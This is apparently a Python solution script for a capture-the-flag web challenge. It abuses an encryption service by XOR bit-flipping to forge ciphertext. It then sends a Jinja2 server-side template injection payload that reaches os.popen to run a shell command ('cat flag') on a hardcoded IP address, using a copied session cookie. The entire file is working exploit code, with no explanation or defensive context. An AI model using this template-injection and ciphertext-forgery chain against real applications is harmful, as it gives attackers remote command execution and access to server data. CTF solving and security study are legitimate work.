import binascii
import html
import requests
url = "http://146.190.104.208:7014/home"
headers = {
    "Host": "localhost:50207/home",
    "Content-Type": "application/x-www-form-urlencoded",
    "Cookie": "session=eyJ1c2VybmFtZSI6ImFkbWluIn0.ZrbPxw.QZDPbbRS4OHsNX8hx0Gb6_M5KJU",
}
offset = "3"*255
data = f"message={offset}&action=Encrypt"
enc = requests.post(url, data=data, headers=headers).text.split('p class="alert alert-info">')[1].split('<')[0]
#unhexed
user_auth=binascii.unhexlify(enc)
def attack(ctx, c, p):
    c_ = bytearray(ctx)
    for i in range(len(c)):
        c_[i] = ctx[i] ^ c[i] ^ p[i]

    return c_

ct = user_auth
payload = b"{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('cat flag').read()}}{%endif%}{% endfor %}"
payload = b"3"*(238-len(payload))+payload+b"333333333333333333"
whut = "3"*(len(payload))
x = len(payload)-18
padding = whut.encode()
a = 1
while True:
    raw = attack(ct, payload, padding)
    url = "http://146.190.104.208:7014/home"
    headers = {
        "Host": "localhost:50207/home",
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": "session=eyJ1c2VybmFtZSI6ImFkbWluIn0.ZrbPxw.QZDPbbRS4OHsNX8hx0Gb6_M5KJU",
        "Connection": "keep-alive"
    }

    data = f"message={raw.hex()}&action=Decrypt"

    req = requests.post(url, data=data, headers=headers)
    req = html.unescape(req.text)

    # print(raw.hex())
    print("HOST:",req.split('<p class="alert alert-info">')[1].split("</p>")[0])
    aa = req.split('<p class="alert alert-info">')[1].split("</p>")[0].split('}}33333333333333')[0]
    aa = bytes(aa, 'latin1').decode('unicode_escape').encode('latin1')
    payload = bytearray(payload)
    payload[x] = aa[-a]
    payload = bytes(payload)
    x -= 1
    a+=1
